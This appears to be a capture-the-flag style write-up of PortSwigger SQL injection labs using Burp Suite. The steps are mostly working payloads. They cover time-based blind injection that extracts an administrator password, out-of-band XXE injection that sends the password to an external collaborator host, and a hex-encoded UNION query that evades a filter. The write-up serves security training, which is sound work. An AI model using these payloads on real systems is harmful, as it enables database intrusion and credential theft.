<img src="images/image102.png" alt="third" width="500">

**Step1:**

Click on categories

**Step2:**

Send the request to repeater

**Step3**

Type this command and lab will be solve

`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

<img src="images/image103.png" alt="third" width="800">

<img src="images/image104.png" alt="third" width="500">


**Step 1:**

Click on any categories as in previous lab

**Step2:**

Send the response of the request to repeater.

**Step3**

We modify request

`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

<img src="images/image105.png" alt="third" width="800">

The response is shown after time

<img src="images/image106.png" alt="third" width="800">

So it is clear that there is a time delay injection.

Replacing `1=1`  with `1=2` the output is shown immediately.

**Step4**

Now we check user administrator is present or not

`'%  3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

So with the response time it is clear that user administrator is present

<img src="images/image106.png" alt="third" width="800">

**Step5**

Now we find the length of password

`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

For this we use intruder.

<img src="images/image107.png" alt="third" width="900">

Payload setting

<img src="images/image108.png" alt="third" width="500">

From the result it is clear that length is 20 because it takes no time to generate response

<img src="images/image109.png" alt="third" width="500">

**Step6**  

finding password for each index

`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Again we use intruder for this purpose and set the payload to cluster bomb type

<img src="images/image110.png" alt="third" width="900">

Payload 1

<img src="images/image111.png" alt="third" width="500">

Payload 2

<img src="images/image112.png" alt="third" width="500">

Now click on column and click response received

<img src="images/image113.png" alt="third" width="500">

Now we sort response received

<img src="images/image114.png" alt="third" width="500">

Password:mk7qel448ezj4bcimol0

<img src="images/image115.png" alt="third" width="500">

**Step 1:**

Click on any categories as in previous lab

**Step2:**

Send the response of the request to repeater.

**Step3:**

Using this payload

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

Adding burp collaborator subdomain

<img src="images/image116.png" alt="third" width="500">

Click on copy to collaborator

Mycase :`zbeaotk65l2z8oqqmqtihzw7vy1ppfd4.oastify.com`

Final exploit

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//zbeaotk65l2z8oqqmqtihzw7vy1ppfd4.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`

Result in collaborator

<img src="images/image117.png" alt="third" width="500">


And lab is solved

<img src="images/image118.png" alt="third" width="500">

**Step 1:**

Click on any categories as in previous lab

**Step2:**

Send the response of the request to repeater.

<img src="images/image119.png" alt="third" width="500">

**Step3:**
Using this query

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

Modify the query

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ebtpo8kl502e83q5m5txhewmvd17p2dr.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`

Click on poll now

Here is the result

<img src="images/image120.png" alt="third" width="500">

`Password:myjzzrk4gj5yomjsigl4`

<img src="images/image121.png" alt="third" width="500">

**Step 1**

Click on

<img src="images/image122.png" alt="third" width="300">

Then

<img src="images/image123.png" alt="third" width="500">

**Step2:**

<img src="images/image124.png" alt="third" width="500">

When we try to inject query in stock id it give error

<img src="images/image125.png" alt="third" width="700">

So we use the hex entities

 `Extensions > Bapp>Hackvertor`

<img src="images/image126.png" alt="third" width="700">

Installing it.

Now we right click then

 `Extensions > Bapp>Hackvertor > Encode > dec_entities/hex_entities.`

And add query

`UNION SELECT username||'~~~'||password FROM users`

<img src="images/image127.png" alt="third" width="500">

output

<img src="images/image128.png" alt="third" width="500">
